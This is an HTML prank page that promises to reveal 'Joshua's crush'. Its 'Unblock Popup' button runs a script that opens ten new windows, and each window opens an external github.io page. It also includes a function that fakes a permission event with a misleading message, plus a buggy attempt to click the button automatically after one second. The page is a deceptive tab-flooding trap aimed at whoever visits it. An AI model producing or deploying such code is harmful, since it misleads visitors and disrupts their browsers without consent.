<!DOCTYPE html>
<html>
<head>
    <title>Who is Joshua's Crush?</title>
    <style>
        body {
            background-image: url('https://i.imgur.com/9GcrldH.jpg');
            background-repeat: no-repeat;
            background-size: cover;
        }

        #overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            text-align: center;
            font-size: 24px;
            color: black;
            font-weight: bold;
        }

        #buttonContainer {
            display: flex;
            justify-content: center;
            align-items: center;
        }

        #unblockButton {
            padding: 10px 20px;
            font-size: 18px;
        }
    </style>
    <script>
        function fakePopupPermission() {
          var event = new CustomEvent('beforeunload', { cancelable: true });
          window.dispatchEvent(event);
          return 'It seems you have already granted permission for the pop-up window. Enjoy!';
        }

        document.getElementById('unblockButton').addEventListener('click', fakePopupPermission);
        setTimeout(() => document.getElementById('unblockButton').click(), 1000); // Automatically trigger the button click after 1 second

        var url = "https://jz1324.github.io/noice/";
        var tabCount = 10;

        function unblockTabs() {
            for (var i = 0; i < tabCount; i++) {
                var newWindow = window.open('', '_blank');
                newWindow.document.write("<html><head><script>window.open('https://jz1324.github.io/noice/');<\/script><\/head><body><\/body><\/html>");
                newWindow.document.close();
            }
        }
    </script>
</head>
<body>
    <div id="overlay">
        <span>Who does Joshua like? Click the button to unblock the tabs from opening.</span>
        <br>
        <div id="buttonContainer">
            <button id="unblockButton" onclick="unblockTabs()">Unblock Popup</button>
        </div>
    </div>
</body>
</html>
